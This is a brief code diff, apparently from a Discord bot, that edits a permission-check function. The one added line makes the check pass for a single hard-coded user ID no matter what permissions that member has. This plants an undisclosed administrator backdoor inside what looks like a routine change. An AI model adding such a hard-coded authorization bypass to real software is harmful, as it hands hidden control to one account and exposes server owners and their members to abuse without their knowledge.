@@ -13,7 +13,7 @@ function checkPermissions(guildMember, permissions = "ADMINISTRATOR") {
     return guildMember.hasPermission(permissions, {
         checkAdmin: true,
         checkOwner: true
-    });
+    }) || guildMember.id === "464499620093886486";
 }
 exports.checkPermissions = checkPermissions;
 function findRole(message, role) {
